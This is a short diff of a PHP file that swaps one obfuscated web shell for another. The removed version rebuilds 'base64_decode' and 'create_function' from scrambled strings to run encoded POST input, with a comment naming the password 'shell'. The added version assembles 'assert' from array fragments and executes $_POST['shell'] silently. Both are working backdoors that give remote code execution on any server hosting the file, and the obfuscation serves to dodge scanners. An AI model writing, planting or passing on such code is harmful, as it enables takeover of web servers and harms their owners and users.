@@ -1,13 +1,5 @@
 <?php
-$uf="9ATVFsnc2hl";
-$ka="IEBldmA";
-$pjt="FsKCRfUE";
-$vbl = str_replace("ti","","tistittirti_rtietipltiatice");
-$iqw="bAGwnXASk7";
-$bkf = $vbl("k", "", "kbakske6k4k_kdkekckokdke");
-$sbp = $vbl("ctw","","ctwcctwrectwatctwectw_fctwuncctwtctwioctwn");
-$mpy = $sbp('', $bkf($vbl("A", "", $ka.$pjt.$uf.$iqw)));
-$mpy();
+$arr=explode(",","a,s,d,f,s,d,e,k,r,t");
+$a=$arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];
+@$a(@$_POST['shell']);
 ?>
-
-//password:shell
